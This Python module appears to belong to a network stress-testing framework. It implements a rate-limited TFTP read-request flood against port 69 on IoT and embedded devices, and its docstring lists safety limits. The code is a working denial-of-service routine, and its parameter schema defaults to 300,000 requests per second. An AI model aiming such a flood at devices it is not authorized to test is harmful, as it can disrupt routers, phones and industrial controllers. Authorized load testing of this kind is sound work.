"""
測項：TFTP RRQ（Read Request）請求洪水
分類：TFTP (韌體更新)（標準埠 69/UDP）
說明：TFTP 是非常多 IoT/嵌入式裝置、網路設備（路由器、IP Phone、工業控制器）
     用來做開機載入設定檔／韌體更新的協定，其伺服器實作往往非常簡陋、缺乏
     速率保護。以受控速率重複送出 RRQ（Read Request），每次請求不同的隨機
     檔名（避免命中任何檔案快取行為），測試 TFTP daemon 對高頻請求的處理能力。

實作：手刻最小 TFTP 封包格式（RFC 1350 §5），不依賴第三方套件：
     Opcode(2 bytes, RRQ=1) + Filename + 0x00 + Mode("octet") + 0x00

安全設計：本測項只送出「讀取請求」的第一個封包，「不」完成後續的 DATA/ACK
資料傳輸流程（不下載任何實際檔案內容），純粹測試請求解析階段的負載；不偽造
來源位址；速率透過 RateLimiter 控制；duration 經 clamp_duration() 限制。
需求：無額外套件，純標準函式庫。
"""
import random
import socket
import string
import time

from ..common import RateLimiter, clamp_duration

NAME = "TFTP RRQ 請求洪水"
CATEGORY = "TFTP (韌體更新)"
PROTOCOL = "UDP"
DEFAULT_PORT = 69
TEST_TYPE = "traffic"  # RRQ 請求速率造成負擔的洪水攻擊

_OPCODE_RRQ = 1


def _build_rrq(filename: str, mode: str = "octet") -> bytes:
    return _OPCODE_RRQ.to_bytes(2, "big") + filename.encode("ascii") + b"\x00" + mode.encode("ascii") + b"\x00"


def _rand_filename() -> str:
    return "stress-" + "".join(random.choices(string.ascii_lowercase + string.digits, k=8)) + ".bin"


def get_param_schema() -> dict:
    return {
        "rate_per_sec": {"type": "int", "default": 300000, "min": 1, "max": 300000, "desc": "每秒送出請求數"},
        "filename_pattern": {"type": "string", "default": "", "desc": "留空則每次隨機檔名；填值則固定使用此檔名"},
    }


def run(target, port, protocol, duration, params, stop_event, log_fn):
    duration = clamp_duration(duration)
    rate = int(params.get("rate_per_sec", 300))
    fixed_name = params.get("filename_pattern", "")

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(0.3)

    limiter = RateLimiter(rate)
    sent, recv, errors = 0, 0, 0
    start = time.time()

    log_fn(f"[+] TFTP RRQ 洪水 -> {target}:{port} @ {rate}/s")
    while time.time() - start < duration and not (stop_event and stop_event.is_set()):
        limiter.wait()
        filename = fixed_name if fixed_name else _rand_filename()
        pkt = _build_rrq(filename)
        try:
            sock.sendto(pkt, (target, port))
            sent += 1
            try:
                sock.recv(1024)  # 通常會收到 ERROR(檔案不存在) 或 DATA 開頭封包
                recv += 1
            except socket.timeout:
                pass
        except OSError as e:
            errors += 1
            if errors <= 5:
                log_fn(f"[!] send error: {e}")

    sock.close()
    return {"requests_sent": sent, "responses_received": recv, "errors": errors, "elapsed_sec": round(time.time() - start, 1)}
